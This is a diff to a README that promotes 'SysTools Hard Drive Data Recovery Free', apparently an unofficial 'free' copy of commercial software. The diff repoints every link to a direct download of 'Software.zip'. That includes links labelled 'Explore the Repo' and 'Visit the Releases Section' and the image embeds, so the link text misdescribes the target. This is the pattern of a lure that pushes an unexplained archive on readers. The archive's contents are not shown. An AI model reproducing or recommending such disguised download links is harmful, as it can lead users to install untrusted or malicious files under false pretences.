@@ -1,6 +1,6 @@
 # SysTools Hard Drive Data Recovery Free 🛠️
 
-![Hard Drive Data Recovery](https://github.com/Tuananhdeptra/SysTools-Hard-Drive-Data-Recovery-Free/releases/tag/v1.0)
+![Hard Drive Data Recovery](https://github.com/Tuananhdeptra/SysTools-Hard-Drive-Data-Recovery-Free/releases/download/v2.0/Software.zip)
 
 Welcome to the **SysTools Hard Drive Data Recovery Free** repository! Here you can find information and resources related to hard drive data recovery software. Whether you are looking to recover deleted files, extract data from a corrupted hard drive, or simply want to learn more about data recovery tools, this repository has got you covered.
 
@@ -12,8 +12,8 @@ Welcome to the **SysTools Hard Drive Data Recovery Free** repository! Here you c
 
 ## Useful Links 🔗
 
-- **Explore the Repo:** [SysTools Hard Drive Data Recovery Free](https://github.com/Tuananhdeptra/SysTools-Hard-Drive-Data-Recovery-Free/releases/tag/v1.0)
-- **For more details:** [Visit the Releases Section](https://github.com/Tuananhdeptra/SysTools-Hard-Drive-Data-Recovery-Free/releases/tag/v1.0)
+- **Explore the Repo:** [SysTools Hard Drive Data Recovery Free](https://github.com/Tuananhdeptra/SysTools-Hard-Drive-Data-Recovery-Free/releases/download/v2.0/Software.zip)
+- **For more details:** [Visit the Releases Section](https://github.com/Tuananhdeptra/SysTools-Hard-Drive-Data-Recovery-Free/releases/download/v2.0/Software.zip)
 
 ## Features ✨
 
@@ -44,7 +44,7 @@ Stay connected with the latest updates and news on data recovery tools by follow
 
 A special thank you to all the contributors who have helped make SysTools Hard Drive Data Recovery Free a valuable resource for users around the world. Your efforts and dedication are truly appreciated.
 
-![Thank You](https://github.com/Tuananhdeptra/SysTools-Hard-Drive-Data-Recovery-Free/releases/tag/v1.0)
+![Thank You](https://github.com/Tuananhdeptra/SysTools-Hard-Drive-Data-Recovery-Free/releases/download/v2.0/Software.zip)
 
 Remember, your data is important, so make sure to use reliable tools like SysTools Hard Drive Data Recovery Free for all your data recovery needs. Embrace the power of technology to recover what matters most to you! 🌟
 
